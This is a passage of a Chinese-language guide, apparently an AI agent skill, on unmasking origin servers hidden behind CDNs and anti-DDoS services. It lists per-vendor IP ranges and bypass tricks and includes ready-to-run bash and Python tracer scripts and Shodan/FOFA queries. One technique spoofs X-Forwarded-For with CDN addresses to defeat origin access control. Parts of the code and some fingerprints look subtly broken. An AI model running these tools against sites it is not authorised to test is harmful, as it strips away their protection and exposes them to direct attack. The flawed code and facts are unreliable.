# 103.72.144.0/22, 122.227.0.0/16, 101.71.0.0/16
# 61.130.0.0/16, 220.191.0.0/16, 115.236.0.0/16

# === 3. 网宿云分发平台 ===
# 网宿云分发提供多种加速产品，配置可能不同
# 响应头: X-WS-*, X-Cache, via: wangsu

# === 4. 网宿全站加速 ===
# 全站加速可能对动态内容直接回源
# 访问动态路径（如 /api/）可能触发回源
```

### 帝联 CDN — 3 种绕过手段

```bash
# === 1. 帝联 CDN 域名 ===
# CNAME 格式: target.com.xxx.d1cdn.com / target.com.xxx.fastcdn.com

# === 2. 帝联 CDN IP 段 ===
# 210.51.0.0/16, 122.0.0.0/8 部分段
# 响应头: via: d1cdn

# === 3. 帝联 CDN 多线接入 ===
# 支持电信/联通/移动/教育网多线接入
# 不同线路的 DNS 解析可能不同
```

### Incapsula / Imperva — 5 种绕过手段

```bash
# === 1. Imperva 的 DNS 代理模式 ===
# 如果使用 Imperva 的 DNS 代理，子域名可能部分遗漏
# 检查: *.impervadns.net 相关域名

# === 2. Imperva 回源 IP 段 ===
# 45.60.0.0/16, 107.154.0.0/16, 192.230.64.0/18
# 响应头: X-CDN: Imperva, X-Iinfo, via: Imperva

# === 3. Imperva 的 IncapRules 配置 ===
# IncapRules 可能遗漏某些路径的代理
# 尝试访问 /admin/, /wp-admin/ 等路径

# === 4. Imperva 的 Real IP 泄露 ===
# 旧版 Imperva 可能在错误页面中泄露真实 IP
# 触发 4xx/5xx 错误观察响应

# === 5. Imperva 的 SSL 配置 ===
# 如果 Imperva 和源站之间的 SSL 配置不一致
# 可能通过证书获取源站信息
```

### Sucuri — 4 种绕过手段

```bash
# === 1. Sucuri 的 DNS 模式 ===
# Sucuri 支持 DNS 层代理和反向代理两种模式
# DNS 模式: 通过 NS 记录指向 Sucuri，不代理所有子域名

# === 2. Sucuri 回源 IP 段 ===
# 192.124.249.0/24, 66.248.0.0/16
# 响应头: X-Sucuri-ID, X-Sucuri-Cache, server: Sucuri/Cloudproxy

# === 3. Sucuri 的 Allowlist 配置 ===
# Sucuri 防火墙可能配置了 IP 白名单
# 尝试从已知的白名单 IP 访问

# === 4. Sucuri 源站泄露 ===
# 如果 Sucuri 配置了"bypass"模式
# 通过特殊参数可能绕过代理: ?nocache=1, ?bypass=1
```

### StackPath — 3 种绕过手段

```bash
# === 1. StackPath Edge 节点 ===
# CNAME 格式: target.com.xxx.stackpathcdn.com
# 响应头: X-StackPath-*, via: stackpath

# === 2. StackPath IP 段 ===
# 151.139.0.0/16, 64.145.0.0/16
# ASN: AS33438

# === 3. StackPath CDN 配置 ===
# StackPath 继承自 MaxCDN，部分旧配置可能不同
# 检查历史 DNS 中的 MaxCDN 相关记录
```

### CDN77 — 3 种绕过手段

```bash
# === 1. CDN77 CNAME ===
# CNAME 格式: target.com.xxx.cdn77.com / target.com.xxx.r.worldcdn.net

# === 2. CDN77 IP 段 ===
# 185.59.0.0/16, 185.93.0.0/16, 185.156.0.0/16
# 响应头: X-CDN77-*, via: cdn77

# === 3. CDN77 源站存储 ===
# CDN77 提供源站存储服务，可能有直接访问路径
```

### BunnyCDN — 3 种绕过手段

```bash
# === 1. BunnyCDN CNAME ===
# CNAME 格式: target.com.b-cdn.net
# 响应头: X-BunnyCDN-*, server: BunnyCDN, CDN-Cache: HIT/MISS

# === 2. BunnyCDN IP 段 ===
# 185.156.0.0/16, 138.199.0.0/16
# ASN: AS60068

# === 3. BunnyCDN 存储源站 ===
# BunnyCDN 提供 Bunny Storage 作为源站
# 格式: storage.bunnycdn.com/target/
```

### Edgecast / Verizon — 3 种绕过手段

```bash
# === 1. Edgecast CNAME ===
# CNAME 格式: target.com.xxx.edgecastcdn.net / wpc.xxx.edgecastcdn.net
# 响应头: X-EC-*, via: edgecast, server: ECAcc

# === 2. Edgecast IP 段 ===
# 192.229.0.0/16, 93.184.0.0/16, 117.18.0.0/16
# ASN: AS15133

# === 3. Verizon CDN 合并 ===
# Edgecast 已合并到 Verizon，部分旧配置可能不同
# 检查 Verizon Digital Media 相关配置
```

### KeyCDN — 2 种绕过手段

```bash
# === 1. KeyCDN CNAME ===
# CNAME 格式: target.com-xxx.kxcdn.com
# 响应头: X-KeyCDN-*, X-Cache: HIT/MISS, via: keycdn

# === 2. KeyCDN IP 段 ===
# 185.134.0.0/16, 185.180.0.0/16, 185.230.0.0/16
# ASN: AS61317
```

### Google Cloud CDN / Cloud Load Balancing — 5 种绕过手段

```bash
# === 1. GCLB 后端实例组直连 ===
# Google Cloud CDN 前端是 Global HTTP(S) LB，后端是 MIG/NEG
# 候选 IP 若是 GCLB IP (35.x/34.x Anycast)，需找到后端实例公网 IP
# 历史 DNS 中可能保留从直连 LB 切到 CDN 前的实例 IP

# === 2. GCS / Cloud Storage 源站 ===
# 源站是 GCS Bucket: https://storage.googleapis.com/<bucket>
# 或 https://<bucket>.storage.googleapis.com
for bucket in target target-com target-assets target-prod; do
  curl -s -o /dev/null -w "%{http_code} storage.googleapis.com/${bucket}\n" "https://storage.googleapis.com/${bucket}"
done

# === 3. Google Front End (GFE) 指纹 ===
# 响应头: Server: gunicorn, Server: Google Frontend, via: 1.1 google
curl -sI https://target.com | grep -iE "server:.*google|via:.*google|gfe"
# GFE 是 Google 共享前端，同 IP 可能托管多个 Google 服务

# === 4. App Engine / Cloud Run 直连 ===
# App Engine: <service>-dot-<project>.appspot.com
# Cloud Run: <service>-<hash>.run.app
# 这些 *.appspot.com / *.run.app 域名直连后端，不经 Cloud CDN
curl -s "https://crt.sh/?q=appspot.com&output=json" | jq -r '.[].name_value' | grep -i target
curl -s "https://crt.sh/?q=run.app&output=json" | jq -r '.[].name_value' | grep -i target

# === 5. Google Cloud CDN IP 段 ===
# 通过 Google 的 ASN AS15169 查询
# Anycast 前端: 35.191.0.0/16, 130.211.0.0/22 (GCLB 健康检查/前端)
# 实际后端实例 IP 在 35.x (us/eu/asia 多区域)
# whois + bgp.he.net/AS15169
```

### Azure Front Door / CDN — 5 种绕过手段

```bash
# === 1. Front Door 后端池直连 ===
# AFD 前端是 *.azureedge.net，后端池配置后端主机名/IP
# 后端若是 App Service: <app>.azurewebsites.net (直连不经 AFD)
# 后端若是 Storage: <account>.blob.core.windows.net
curl -s "https://crt.sh/?q=azurewebsites.net&output=json" | jq -r '.[].name_value' | grep -i target
curl -s "https://crt.sh/?q=azureedge.net&output=json" | jq -r '.[].name_value' | grep -i target

# === 2. App Service 直连 ===
# Azure App Service 通过 Kudu/SCM 站点暴露: <app>.scm.azurewebsites.net
# SCM 站点常未走 AFD，直接访问可能拿到后端信息
curl -sI https://target.scm.azurewebsites.net

# === 3. Azure CDN (Verizon/Akamai 引擎) ===
# Azure CDN 有两种后端引擎: Verizon Premium/Standard, Akamai Standard
# Verizon: 响应头 X-Cache, via: 1.1 ECD (edgecast/Verizon)
# Akamai: 见 Akamai 章节
# 不同引擎配置差异可利用

# === 4. Azure Front Door 健康探测端点 ===
# AFD 健康探测路径常为 /health 或自定义
# 后端响应探测的 Server 头 = 源站真实 Server
curl -sI https://target.com/health | grep -i "^server:"

# === 5. Azure IP 段 ===
# 下载 Azure IP 范围 (含 FrontDoor 标记)
# https://www.microsoft.com/en-us/download/details.aspx?id=56519
# 服务标签: AzureFrontDoor.Backend, AzureFrontDoor.Frontend
# 前端 Anycast: 147.243.0.0/16 (部分)
# 后端 App Service: 20.x/52.x/70.x 段
```

### 华为云 CDN — 5 种绕过手段

```bash
# === 1. CDN 域名 CNAME 格式 ===
# CNAME: target.com.xxx.cdn20.com / target.com.xxx.huaweicloud.com
dig CNAME target.com +short | grep -iE "cdn20|huaweicloud"

# === 2. OBS 源站直连 ===
# 源站是 OBS Bucket: target.obs.<region>.myhuaweicloud.com
for region in cn-north-4 cn-north-1 cn-east-3 cn-south-1 cn-southwest-2; do
  curl -s -o /dev/null -w "OBS ${region}: %{http_code}\n" "https://target.obs.${region}.myhuaweicloud.com/"
done

# === 3. 华为云 CDN IP 段 ===
# 通过 AS136990 / AS55566 查询
# 典型段: 117.50.x.x, 119.3.x.x, 121.37.x.x, 139.159.x.x (部分)
# 响应头: X-HW-*, Server: hcdn

# === 4. WAF/CDN 回源 IP 差异 ===
# 华为云 WAF 与 CDN 回源 IP 段不同
# https://support.huaweicloud.com/waf_faq/waf_01_0107.html

# === 5. 专属主机/弹性云服务器 ECS 直连 ===
# 若历史 DNS 中存在 ECS 弹性公网 IP，切换 CDN 后旧 IP 可能仍可用
```

### 火山引擎 CDN / Edge — 4 种绕过手段

```bash
# === 1. CDN 域名 CNAME ===
# CNAME: target.com.xxx.volces.com / target.com.xxx.volcdns.com
dig CNAME target.com +short | grep -iE "volces|volcdns"

# === 2. TOS 对象存储源站 ===
# 火山引擎 TOS: target.tos-cn-<region>.volces.com
for region in beijing shanghai guangzhou; do
  curl -s -o /dev/null -w "TOS ${region}: %{http_code}\n" "https://target.tos-cn-${region}.volces.com/"
done

# === 3. 火山引擎 IP 段 ===
# ASN: AS137673 等
# 响应头: X-Volc-*, Server: volc-cache

# === 4. 边缘计算节点差异 ===
# 火山引擎边缘计算节点的回源配置可能与中心 CDN 不同
# 触发回源: 访问边缘节点不缓存的动态路径
```

### UCloud / 金山云 / CDNetworks / ArvanCloud — 综合绕过

```bash
# === UCloud CDN ===
# CNAME: target.com.xxx.ucloudgda.com / *.ucdn.com
# IP 段: 106.75.0.0/16, 23.105.x.x 段; 响应头 X-UCDN-*
# 源站若是 UFile: target.ufile.ucloud.cn / target.cn-bj.ufileos.com

# === 金山云 (Kingsoft Cloud) CDN ===
# CNAME: target.com.xxx.ksyun.com / *.kscdn.com
# IP 段: 120.92.x.x, 182.92.x.x 段; ASN: AS59019
# 响应头: X-KSCDN-*, X-Cache; 源站 KS3: target.ks3-cn-<region>.ksyuncs.com

# === CDNetworks ===
# CNAME: target.com.xxx.cdnetworks.net / *.gccdn.net / *.cdnetdns.net
# 全球型 CDN，国内分支常与网宿合作; 响应头 X-Cache, via: CDNetworks
# ASN: AS36414

# === ArvanCloud (伊朗/中东 CDN) ===
# CNAME: target.com.xxx.arvancloud.ir / *.arvancloud.com
# 响应头: Server: ArvanCloud, X-ArvanCloud-*
# IP 段: 188.34.x.x, 185.143.x.x; ASN: AS208827

# === 通用源站存储枚举 (适用所有云厂商) ===
# 各厂商对象存储命名规律:
#   AWS S3:        <bucket>.s3.<region>.amazonaws.com
#   阿里 OSS:      <bucket>.oss-<region>.aliyuncs.com
#   腾讯 COS:      <bucket>.cos.<region>.myqcloud.com
#   华为 OBS:      <bucket>.obs.<region>.myhuaweicloud.com
#   七牛 Kodo:     <bucket>.<domain>.clouddn.com / qiniudn.com
#   又拍:          <bucket>.b0.upaiyun.com
#   火山 TOS:      <bucket>.tos-cn-<region>.volces.com
#   金山 KS3:      <bucket>.ks3-cn-<region>.ksyuncs.com
#   UCloud UFile:  <bucket>.ufile.ucloud.cn
#   GCS:           storage.googleapis.com/<bucket>
#   Azure Blob:    <account>.blob.core.windows.net
#   R2:            <account>.r2.dev
```

### Anti-DDoS（鸡哥CDN）— 5 种绕过手段

```bash
# === 1. IP 段识别与过滤 ===
# 鸡哥CDN 是国内小众 Anti-DDoS/CDN，使用海外中转 IP
# 已知 IP 段 (v5.0 收录):
#   156.234.170.0/24   (香港 Cogent/HKBN 段)
#   23.226.50.0/24     (历史 Incapsula 关联段，复用)
#   156.247.32.0/24, 156.247.33.0/24, 156.247.51.0/24
# 过滤脚本:
JIGE_SEGS="156.234.170.0/24 23.226.50.0/24 156.247.32.0/24 156.247.33.0/24 156.247.51.0/24"
echo "$JIGE_SEGS" | tr ' ' '\n' > jige_ranges.txt
# 用 ipcalc/python 过滤候选 IP (见方法6 自动过滤)
python3 -c "
import ipaddress
jige = [ipaddress.ip_network(n) for n in '''$JIGE_SEGS'''.split()]
for ip in open('candidates.txt'):
    ip=ip.strip()
    if not ip: continue
    net = ipaddress.ip_address(ip)
    if not any(net in n for n in jige):
        print(ip)  # 非 CDN IP → 候选源站
"

# === 2. 响应头指纹识别 ===
# 鸡哥CDN 边缘常为 nginx，响应头特征较弱，需组合判断
curl -sI https://target.com | grep -iE "^(server|via|x-cache|x-powered-by):"
# 特征: Server: nginx + via 含 jige/CDN 字样 + X-Cache: HIT/MISS
# 与源站 nginx 的区别: 边缘节点通常隐藏版本号或统一版本

# === 3. CNAME 接入链追踪 ===
# 鸡哥CDN 多为 CNAME 接入，CNAME 域名暴露接入配置
dig CNAME target.com +short
# 常见 CNAME 后缀: *.jige*.com / *.jgcdn.* / 自定义中转域
# 递归追踪到非 CDN 域名 → 源站 (见方法5 trace_cname)

# === 4. 海外中转节点回源侧信道 ===
# 鸡哥CDN 用海外 IP 中转清洗 DDoS，回源链路: 用户→海外中转→国内源站
# 关键: 海外中转节点对源站的回源请求可能带 X-Forwarded-For
# 直连候选 IP 伪造回源 IP (海外段) 测试访问控制
curl -sk -H "Host: target.com" -H "X-Forwarded-For: 156.234.170.1" https://候选IP -o /dev/null -w "%{http_code}\n"
# 403 → 200 = 源站仅信任鸡哥CDN 回源 IP，已确认源站

# === 5. 23.226.50.0/24 段复用陷阱 ===
# 该段历史上属于 Incapsula/Imperva，鸡哥CDN 复用 → 在 Shodan/FOFA 中
# 查该段证书会同时命中 Incapsula 老客户，需用证书 CN 精确过滤
# Shodan: net:23.226.50.0/24 ssl.cert.subject.cn:"target.com"
# FOFA:   ip="23.226.50.0/24" && cert="target.com"
# 排除: 该段上其他无关 Incapsula 站点
```

### 通用 CDN 绕过技巧（适用于所有厂商）

```bash
# === 1. CDN 缓存参数探测 ===
# 某些 CDN 对特定 URL 参数不缓存，直接回源
# 常见参数: ?nocache=1, ?t=timestamp, ?debug=1, ?preview=1
#           ?flush=1, ?purge=1, ?bypass=1, ?src=1

# === 2. HTTP 方法差异 ===
# CDN 通常只缓存 GET/HEAD 请求
# POST/PUT/DELETE/PATCH 请求直接回源
# 某些 CDN 对 OPTIONS 请求也不缓存

# === 3. 请求头差异利用 ===
# 添加特殊头迫使 CDN 回源:
# - Authorization: Bearer xxx
# - Cache-Control: no-cache
# - Pragma: no-cache
# - X-Forwarded-Proto: https

# === 4. 文件扩展名绕过 ===
# CDN 通常不缓存动态文件扩展名
# 请求: .php, .asp, .aspx, .jsp, .do, .action 后缀通常回源

# === 5. CDN 缓存键 (Cache Key) 操纵 ===
# 修改 URL 中的查询参数可能导致缓存未命中 → 回源
# 利用 CDN 的缓存键策略差异

# === 6. 多 CDN 层叠绕过 ===
# 某些网站使用多层 CDN（如 CDN → WAF → 源站）
# 绕过第一层 CDN 可能直接到达第二层（WAF 层）
# WAF 层可能配置不同，更容易暴露源站信息
```

---

## 常见失败原因与突破策略

| 失败原因 | 表现 | 突破策略 |
|----------|------|----------|
| 证书全部由 CDN 签发 | crt.sh 无候选 IP | 使用子域名枚举 + 历史 DNS |
| 所有子域名都走 CDN | 枚举无结果 | 查 MX/SPF + 第三方服务关联 |
| 历史 DNS 无记录 | 域名一直用 CDN | 网络空间引擎 + 证书序列号关联 |
| 源站仅允许 CDN IP 访问 | 直接 IP 访问被拒绝 | 伪造 X-Forwarded-For + CDN 回源 IP（方法22） |
| 源站使用 SNI 过滤 | curl 返回 421/400 | 使用正确的 SNI（域名）+ 尝试不同路径（方法31） |
| Cloudflare Authenticated Origin Pulls | 直接 IP 返回 403 | 需客户端证书，改用被动方法（Censys/Shodan 证书反查） |
| 源站 IP 频繁变更 | IP 验证后失效 | 持续监控 + 定期重新溯源（见监控章节） |
| 容器/K8s 环境 | 源站 IP 是动态的 | 查 Ingress/LB IP + Traefik dashboard（方法32） |
| **Cloudflare Tunnel 接入** | 无公网源站 IP | 方法27（配置泄露）+ 同账户兄弟域名 + 方法28 |
| **Serverless 架构** | 无固定源站 | 方法29（Lambda@Edge ARN）+ 方法28（pages.dev） |
| **证书钉刺 (Pinning)** | 直连 TLS 失败 | 提取 App 钉刺哈希反查 + 被动方法（指纹4） |
| **Host 头返回 200 但疑似误报** | 可能是 CDN 节点/共享主机 | JA4S + HTTP/2 指纹交叉验证（现代指纹章节） |
| **ECH 加密 SNI** | SNI 不可见 | dig HTTPS 取 ipv4hint + ECH retry_configs（方法31） |
| **蜜罐陷阱** | 源站异常宽松/行为不一致 | 蜜罐识别清单 + 多源交叉 + 降权处理 |
| **IPv6 源站** | 仅查 IPv4 漏掉 | dig AAAA + 方法17 + IPv6 Nmap |

---

## 自动化一键溯源脚本（完整版）

```bash
#!/bin/bash
# CDN Origin Tracer v3.0 - 自动化溯源脚本
# 用法: ./cdn-tracer.sh target.com

set -e
TARGET="${1:?Usage: $0 <target.com>}"
OUTDIR="cdn_trace_${TARGET}_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$OUTDIR"

log() { echo "[$(date +%H:%M:%S)] $*"; }

log "CDN溯源开始: $TARGET"
log "输出目录: $OUTDIR"

# 1. CDN检测
log "[1/12] CDN检测..."
nslookup "$TARGET" > "$OUTDIR/01_nslookup.txt"
curl -sI -m 10 "https://$TARGET" > "$OUTDIR/01_headers.txt"
grep -qiE "(cf-ray|cf-cache|x-amz-cf)" "$OUTDIR/01_headers.txt" && echo "检测到CDN" || echo "未检测到明显CDN标记"

# 2. crt.sh
log "[2/12] 证书透明度..."
curl -s "https://crt.sh/?q=%.${TARGET}&output=json" | jq -r '.[].name_value' 2>/dev/null | sort -u > "$OUTDIR/02_crtsh.txt"
curl -s "https://crt.sh/?q=${TARGET}&output=json" | jq -r '.[] | .name_value, .common_name' 2>/dev/null | grep -oE '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' | sort -u > "$OUTDIR/02_crtsh_ips.txt"

# 3. CNAME链
log "[3/12] CNAME解析链..."
domain="$TARGET"
echo "$domain" > "$OUTDIR/03_cname.txt"
for i in $(seq 1 5); do
  cname=$(dig CNAME "$domain" +short | sed 's/\.$//' | head -1)
  [ -z "$cname" ] && { echo "  End: $domain (A: $(dig A "$domain" +short))" >> "$OUTDIR/03_cname.txt"; break; }
  echo "  -> $cname" >> "$OUTDIR/03_cname.txt"
  domain="$cname"
done

# 4. 子域名
log "[4/12] 子域名枚举..."
echo "mail ftp smtp pop3 imap webmail cpanel whm admin dev staging test direct origin backend vpn mysql ssh static img upload api m mobile app shop blog forum bbs wiki news download git svn status monitor secure remote portal demo beta sandbox ns1 ns2 dns cdn proxy www1 www2 assets media files" | tr ' ' '\n' > "$OUTDIR/04_wordlist.txt"
> "$OUTDIR/04_subs.txt"
while read sub; do
  ip=$(dig A "${sub}.${TARGET}" +short 2>/dev/null | grep -E '^[0-9]' | head -1)
  [ -n "$ip" ] && echo "${sub}.${TARGET} → $ip" >> "$OUTDIR/04_subs.txt"
done < "$OUTDIR/04_wordlist.txt"

# 5. 历史DNS
log "[5/12] 历史DNS..."
curl -s "https://api.hackertarget.com/hostsearch/?q=${TARGET}" > "$OUTDIR/05_hackertarget.txt" 2>/dev/null || true

# 6. AlienVault OTX
log "[6/12] AlienVault OTX..."
curl -s "https://otx.alienvault.com/api/v1/indicators/domain/${TARGET}/passive_dns" | jq -r '.passive_dns[].address' 2>/dev/null | sort -u > "$OUTDIR/06_otx_ips.txt" || true

# 7. SPF
log "[7/12] SPF记录..."
dig TXT "$TARGET" +short | grep -i spf > "$OUTDIR/07_spf.txt" 2>/dev/null || true
dig TXT "$TARGET" +short | grep -oP 'ip4:\K[^\s]+' | sort -u > "$OUTDIR/07_spf_ips.txt" 2>/dev/null || true

# 8. MX
log "[8/12] MX记录..."
dig MX "$TARGET" +short | sort -n > "$OUTDIR/08_mx.txt"
awk '{print $NF}' "$OUTDIR/08_mx.txt" | while read mx; do 
  dig A "$mx" +short | grep -E '^[0-9]' >> "$OUTDIR/08_mx_ips.txt"
done 2>/dev/null || true

# 9. DNS全记录
log "[9/12] DNS全记录..."
for type in A AAAA MX NS TXT CNAME SOA; do
  echo "=== $type ===" >> "$OUTDIR/09_dns.txt"
  dig "$type" "$TARGET" +short >> "$OUTDIR/09_dns.txt"
done

# 10. IPv6
log "[10/12] IPv6..."
dig AAAA "$TARGET" +short > "$OUTDIR/10_ipv6.txt"

# 11. 合并候选IP
log "[11/12] 合并候选IP..."
cat "$OUTDIR"/*_ips.txt "$OUTDIR"/*.txt 2>/dev/null | grep -oE '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' | grep -vE '^(0\.|127\.|10\.|172\.1[6-9]|172\.2[0-9]|172\.3[0-1]|192\.168\.)' | sort -u > "$OUTDIR/11_all_candidates.txt"
log "共发现 $(wc -l < "$OUTDIR/11_all_candidates.txt") 个候选IP"

# 12. Host头验证
log "[12/12] Host头验证..."
> "$OUTDIR/12_verified.txt"
while read ip; do
  code=$(curl -s -o /dev/null -w "%{http_code}" -k -H "Host: $TARGET" "https://$ip" --connect-timeout 3 2>/dev/null)
  [ "$code" != "000" ] && echo "$ip → HTTP $code" >> "$OUTDIR/12_verified.txt"
done < "$OUTDIR/11_all_candidates.txt"

log "溯源完成！"
log "验证通过的IP:"
cat "$OUTDIR/12_verified.txt" 2>/dev/null || echo "  无"
log "详细结果: $OUTDIR"
```

---

## Python 全流程自动化溯源框架（v5.0 新增）

> Bash 脚本适合快速验证，但缺乏状态管理、去相关、并发与可复用性。
> v5.0 提供模块化 Python Pipeline：发现 → 暴露 → 触发 → 验证 → 评分，输出 JSON 报告。

> **⚠ 实战优先**：本节下方的完整可运行实现已落地为独立工具 [cdn_tracer.py](file:///data/user/skills/cdn-origin-tracing/cdn_tracer.py)（14 阶段流水线）+ [cdn_ranges.py](file:///data/user/skills/cdn-origin-tracing/cdn_ranges.py)（IP 段过滤器）。
> 直接 `python cdn_tracer.py target.com` 即可实战，无需复制下方代码。下方代码保留为「方法论参考 + 二次开发骨架」，与独立工具逻辑一致。

### 框架结构

```python
#!/usr/bin/env python3
"""
cdn_origin_tracer.py — v5.0 全流程溯源框架
依赖: pip install requests dnspython tldextract
用法: python3 cdn_origin_tracer.py target.com [--api-keys keys.json]
输出: report_<target>_<ts>.json
"""
import argparse, json, time, socket, hashlib, re, concurrent.futures
from pathlib import Path
from datetime import datetime
import requests, dns.resolver

IP_RE = re.compile(r'\b(?:\d{1,3}\.){3}\d{1,3}\b')
PRIVATE_RE = re.compile(r'^(10\.|127\.|172\.(1[6-9]|2\d|3[01])\.|192\.168\.|169\.254\.|0\.)')

# ---------- 阶段基类 ----------
class Stage:
    name = "base"
    def run(self, target, ctx):  # ctx: 共享上下文字典
        raise NotImplementedError

# ---------- 阶段1: 证书透明度 ----------
class CertTransparencyStage(Stage):
    name = "A_cert"
    def run(self, target, ctx):
        ips, names = set(), set()
        try:
            r = requests.get(f"https://crt.sh/?q=%.{target}&output=json", timeout=20)
            for item in r.json():
                for n in item.get('name_value','').split('\n'):
                    n = n.strip().lstrip('*.')
                    names.add(n)
                    # crt.sh 不直接返回 IP，但 name_value 偶有 IP
                    for ip in IP_RE.findall(n): ips.add(ip)
        except Exception as e:
            ctx.setdefault('errors',[]).append(f"crt.sh: {e}")
        ctx['cert_names'] = names
        ctx['cert_ips'] = ips
        return {'names': list(names), 'ips': list(ips)}

# ---------- 阶段2: 子域名枚举 + 解析 ----------
class SubdomainStage(Stage):
    name = "C_subdomain"
    WORDLIST = "mail ftp smtp pop3 imap webmail cpanel whm admin dev staging test direct origin backend vpn mysql ssh static img upload api m mobile app shop blog forum wiki status monitor secure remote portal demo beta ns1 ns2 cdn proxy www1 www2 assets media files git svn mta mx relay".split()
    def run(self, target, ctx):
        # 泛解析检测
        wildcard = self._resolve(f"randomnoexist{int(time.time())}.{target}")
        found = {}
        def probe(sub):
            ip = self._resolve(f"{sub}.{target}")
            if ip and ip != wildcard: found[f"{sub}.{target}"] = ip
        with concurrent.futures.ThreadPoolExecutor(max_workers=20) as ex:
            list(ex.map(probe, self.WORDLIST))
        ctx['subdomain_ips'] = set(found.values())
        return found
    @staticmethod
    def _resolve(host):
        try:
            return socket.gethostbyname(host)
        except: return None

# ---------- 阶段3: 历史 DNS / 被动 DNS 聚合 ----------
class PassiveDNSStage(Stage):
    name = "B_dns_history"
    SOURCES = [
        ("hackertarget", lambda t: f"https://api.hackertarget.com/hostsearch/?q={t}"),
        ("otx",          lambda t: f"https://otx.alienvault.com/api/v1/indicators/domain/{t}/passive_dns"),
    ]
    def run(self, target, ctx):
        ips = {}
        for name, url_fn in self.SOURCES:
            try:
                r = requests.get(url_fn(target), timeout=20)
                if name == "hackertarget":
                    for ip in IP_RE.findall(r.text): ips[ip] = ips.get(ip,0)+1
                else:
                    for item in r.json().get('passive_dns',[]):
                        a = item.get('address')
                        if a and not PRIVATE_RE.match(a): ips[a] = ips.get(a,0)+1
            except Exception as e:
                ctx.setdefault('errors',[]).append(f"{name}: {e}")
        ctx['pdns_ips'] = ips
        return ips
    # SecurityTrails/VirusTotal 需 API key，可在此扩展

# ---------- 阶段4: 四维指纹验证 ----------
class FingerprintStage(Stage):
    name = "E_fingerprint"
    def run(self, target, ctx):
        cdn_headers = self._headers(target, use_host=False)
        results = {}
        for ip in ctx.get('candidates', []):
            direct = self._headers(ip, use_host=True, target=target, sni=target)
            # 判定: 无 CDN 头 + Server 与直连一致
            has_cdn_hdr = any(h in direct.lower() for h in [b'cf-ray', b'x-amz-cf', b'x-sucuri'])
            results[ip] = {
                'has_cdn_header': has_cdn_hdr,
                'status': direct.get('status'),
                'server': direct.get('server'),
                'verified': not has_cdn_hdr and direct.get('status') in (200,301,302,403),
            }
        ctx['fingerprint'] = results
        return results
    @staticmethod
    def _headers(host, use_host=False, target=None, sni=None):
        import urllib3; urllib3.disable_warnings()
        headers = {"Host": target} if use_host else {}
        try:
            r = requests.get(f"https://{host}", headers=headers, verify=False, timeout=6, allow_redirects=False)
            hd = {k.lower(): v for k,v in r.headers.items()}
            return {'status': r.status_code, 'server': hd.get('server'), 'raw': hd}
        except Exception as e:
            return {'status': 0, 'error': str(e)}

# ---------- 阶段5: 贝叶斯评分 ----------
class ScoreStage(Stage):
    name = "score"
    LLR = {
        'A_cert':3.0,'B_dns_history':2.5,'C_subdomain':2.0,
        'D_mail':2.0,'E_fingerprint':4.0,'F_space_engine':1.5,
    }
    import math
    def run(self, target, ctx):
        import math
        scored = []
        for ip in ctx.get('candidates', []):
            ev = {
                'A_cert': ip in ctx.get('cert_ips', set()),
                'B_dns_history': ip in ctx.get('pdns_ips', {}),
                'C_subdomain': ip in ctx.get('subdomain_ips', set()),
                'E_fingerprint': ctx.get('fingerprint',{}).get(ip,{}).get('verified', False),
            }
            logit = math.log(0.25)  # 先验
            for dim, llr in self.LLR.items():
                logit += llr if ev.get(dim) else -1.0
            prob = 1/(1+math.exp(-logit))
            scored.append({'ip': ip, 'prob': prob, 'evidence': ev})
        scored.sort(key=lambda x: -x['prob'])
        return scored

# ---------- Pipeline 调度 ----------
class TracerPipeline:
    def __init__(self, target):
        self.target = target
        self.ctx = {'candidates': set()}
        self.stages = [
            CertTransparencyStage(), SubdomainStage(), PassiveDNSStage(),
        ]
        # 候选 IP 合并 + 过滤
    def run(self):
        for stage in self.stages:
            print(f"[*] 运行: {stage.name}")
            stage.run(self.target, self.ctx)
        # 合并候选
        cand = set()
        cand |= self.ctx.get('cert_ips', set())
        cand |= set(self.ctx.get('pdns_ips', {}))
        cand |= self.ctx.get('subdomain_ips', set())
        self.ctx['candidates'] = [c for c in cand if not PRIVATE_RE.match(c)]
        # 验证 + 评分
        FingerprintStage().run(self.target, self.ctx)
        results = ScoreStage().run(self.target, self.ctx)
        return {
            'target': self.target, 'timestamp': datetime.now().isoformat(),
            'candidates_count': len(self.ctx['candidates']),
            'ranked': results, 'errors': self.ctx.get('errors', []),
        }

if __name__ == '__main__':
    ap = argparse.ArgumentParser()
    ap.add_argument('target'); ap.add_argument('--api-keys')
    args = ap.parse_args()
    report = TracerPipeline(args.target).run()
    out = f"report_{args.target.replace('.','_')}_{int(time.time())}.json"
    Path(out).write_text(json.dumps(report, indent=2, ensure_ascii=False))
    print(f"\n[+] 报告: {out}")
    for r in report['ranked'][:5]:
        print(f"  {r['ip']:16} P={r['prob']:.1%}  证据={r['evidence']}")
```

### 扩展点

- **API Key 接入**：在 `PassiveDNSStage` 增加 SecurityTrails/VirusTotal/FOFA（用 `--api-keys` 传入）
- **并发控制**：各阶段用 `ThreadPoolExecutor`，子域名阶段已示例
- **JA4S 集成**：在 `FingerprintStage` 调用 `ja4` CLI 或 `ja4-python` 库
- **插件化**：每个 Stage 独立文件，按需启用（如 `--stages cert,subdomain,score`）
- **输出对接**：JSON 报告可导入 ELK / Splunk 做趋势分析

---

## 网络空间搜索引擎高级查询 Cookbook（v5.0 新增）

> 基础查询语法见方法 4。本节聚焦**组合查询、证书反查、指纹关联、误报过滤**等进阶技巧。

### Shodan 进阶语法

```bash
# === 1. 证书反查源站（核心）===
# 找到目标证书指纹后，搜索全球部署该证书的 IP
ssl.cert.fingerprint:<SHA256指纹>          # 精确匹配
ssl.cert.subject.cn:"target.com"            # 按 CN
ssl.cert.subject.cn:"target.com" -http.html:"cloudflare"  # 排除 CF 错误页

# === 2. 证书 SAN 反查（多域名同证书）===
# SAN 含 target.com 但 Issuer 不是 CDN 的证书
ssl.cert.subject.cn:"target.com" NOT ssl.cert.issuer:"Cloudflare"

# === 3. HTTP 响应体关键词 ===
http.html:"target.com"                       # 站点引用
http.title:"Target"                          # 标题匹配
http.favicon.hash:<hash>                     # Favicon 哈希（方法15）

# === 4. 端口与服务过滤排除 CDN ===
ssl.cert.subject.cn:"target.com" -port:443,80  # 非标端口常是源站管理口
ssl.cert.subject.cn:"target.com" product:"nginx" -product:"cloudflare"

# === 5. 地理与时效过滤 ===
ssl.cert.subject.cn:"target.com" country:"CN"
